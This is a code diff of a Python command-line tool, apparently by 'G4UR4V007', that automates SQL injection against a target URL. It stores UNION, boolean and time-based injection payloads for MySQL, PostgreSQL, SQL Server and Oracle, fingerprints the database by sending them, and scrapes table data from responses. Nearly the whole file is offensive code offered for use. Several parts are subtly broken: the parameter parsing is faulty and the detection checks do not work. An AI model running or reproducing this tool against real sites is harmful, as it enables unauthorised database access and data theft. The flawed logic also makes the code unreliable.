@@ -9,6 +9,7 @@
 import requests
 from bs4 import BeautifulSoup
 import argparse
+import time
 
 # Define the banner
 BANNER = """
@@ -20,85 +21,124 @@ BANNER = """
  \_____|\__,_|_|  \__,_|\___|_| |_|
                                    
                                    
- Union-Based SQL Injection Tool
+ Automated SQL Injection tool
  Version: 1.0
  Author: G4UR4V007
 """
 
-# Define the usage
-USAGE = """
-usage: union_sqli.py [-h] -u URL -p PARAM -d DBMS
-
-optional arguments:
-  -h, --help            show this help message and exit
-  -u URL, --url URL     target URL
-  -p PARAM, --param PARAM  vulnerable parameter
-  -d DBMS, --dbms DBMS  database management system (e.g., MySQL, PostgreSQL)
-"""
-
 # Define the supported DBMS
-SUPPORTED_DBMS = ["MySQL", "PostgreSQL"]
+SUPPORTED_DBMS = {
+    "MySQL": {
+        "UNION": "' UNION SELECT * FROM information_schema.tables --",
+        "BOOLEAN": "' OR 1=1 --",
+        "TIME": "' OR SLEEP(5) --"
+    },
+    "PostgreSQL": {
+        "UNION": "' UNION SELECT * FROM pg_tables --",
+        "BOOLEAN": "' OR 1=1 --",
+        "TIME": "' OR pg_sleep(5) --"
+    },
+    "Microsoft SQL Server": {
+        "UNION": "' UNION SELECT * FROM sys.tables --",
+        "BOOLEAN": "' OR 1=1 --",
+        "TIME": "' OR WAITFOR DELAY '00:00:05' --"
+    },
+    "Oracle": {
+        "UNION": "' UNION SELECT * FROM all_tables --",
+        "BOOLEAN": "' OR 1=1 --",
+        "TIME": "' OR DBMS_LOCK.SLEEP(5) --"
+    }
+}
 
-def get_args():
-    parser = argparse.ArgumentParser(description=BANNER, usage=USAGE)
-    parser.add_argument("-u", "--url", required=True, help="target URL")
-    parser.add_argument("-p", "--param", required=True, help="vulnerable parameter")
-    parser.add_argument("-d", "--dbms", required=True, help="database management system")
-    args = parser.parse_args()
-    return args
+def detect_dbms(url, param):
+    for dbms, payloads in SUPPORTED_DBMS.items():
+        for technique in payloads.keys():
+            print(f"[+] Testing {dbms} with {technique} technique...")
+            params = {param: payloads[technique]}
+            response = requests.get(url, params=params)
+            if "information_schema.tables" in response.text or "pg_tables" in response.text:
+                print(f"[+] Detected DBMS: {dbms}")
+                return dbms
+    print("[-] No supported DBMS detected.")
+    return None
+
+def break_url(url):
+    # Break the URL using a single quote
+    broken_url = url + "'"
+    return broken_url
+
+def balance_url(url):
+    # Balance the URL by commenting out the remaining part
+    balanced_url = url + "#"
+    return balanced_url
 
 def test_sqli(url, param, dbms):
-    # Send a request to the target URL with a malicious payload
-    payload = "' UNION SELECT * FROM information_schema.tables --"
-    params = {param: payload}
-    response = requests.get(url, params=params)
-    
-    # Check for SQL injection vulnerability in the response
-    if "information_schema.tables" in response.text:
-        print("[+] SQL injection vulnerability found!")
-        return True
-    else:
-        print("[-] No SQL injection vulnerability found.")
-        return False
+    for technique, payload in SUPPORTED_DBMS[dbms].items():
+        print(f"[+] Testing for SQL injection with {technique} technique...")
+        params = {param: payload}
+        response = requests.get(url, params=params)
+        if technique == "BOOLEAN":
+            if "1=1" in response.text:
+                return True
+        elif technique == "TIME":
+            start_time = time.time()
+            requests.get(url, params=params)
+            end_time = time.time()
+            if end_time - start_time > 5:
+                return True
+        else:
+            if "information_schema.tables" in response.text or "pg_tables" in response.text:
+                return True
+    return False
 
 def extract_data(url, param, dbms):
-    # Extract the database structure
     print("[+] Extracting database information...")
-    payload = "' UNION SELECT table_name, column_name FROM information_schema.columns --"
+    payload = SUPPORTED_DBMS[dbms]["UNION"]
     params = {param: payload}
     response = requests.get(url, params=params)
-    
-    # Parse the response to extract the database structure
-    tables = []
-    columns = []
     soup = BeautifulSoup(response.text, 'html.parser')
+    data = []
+    
     for row in soup.find_all('tr'):
         cols = row.find_all('td')
-        if len(cols) == 2:
-            tables.append(cols[0].text.strip())
-            columns.append(cols[1].text.strip())
-
-    # Print the extracted data
-    print("[+] Database structure:")
-    for table, column in zip(tables, columns):
-        print(f"  - {table}.{column}")
+        data.append([col.text.strip() for col in cols])
+    
+    return data
 
 def main():
-    args = get_args()
-    url = args.url
-    param = args.param
-    dbms = args.dbms
+    print(BANNER)
+    
+    parser = argparse.ArgumentParser(description="SQL Injection Tool")
+    parser.add_argument("-u", "--url", required=True, help="Target URL with vulnerable parameter")
+    args = parser.parse_args()
 
-    # Check if the DBMS is supported
-    if dbms not in SUPPORTED_DBMS:
-        print("[-] Unsupported DBMS. Please use one of the following: {}".format(", ".join(SUPPORTED_DBMS)))
+    # Assume the vulnerable parameter is included in the URL (e.g., http://example.com/vulnerable.php?id=1)
+    url = args.url
+
+    # Extract the parameter name from the URL
+    param = url.split('=')[0].split('?')[-1]
+
+    # Detect the DBMS
+    dbms = detect_dbms(url, param)
+    if not dbms:
         return
 
+    # Break the URL using a single quote
+    broken_url = break_url(url)
+
+    # Balance the URL by commenting out the remaining part
+    balanced_url = broken_url + "-- -"
+
     # Test for SQL injection vulnerability
-    if test_sqli(url, param, dbms):
-        # Extract data from the database
-        extract_data(url, param, dbms)
+
+    if test_sqli(balanced_url, param, dbms):
+        print("[+] SQL injection vulnerability found!")
+        data = extract_data(balanced_url, param, dbms)
+        print("[+] Data extracted from the database:")
+        for row in data:
+            print(row)
+    else:
+        print("[-] No SQL injection vulnerability found.")
 
 if __name__ == "__main__":
-    print(BANNER)
     main()
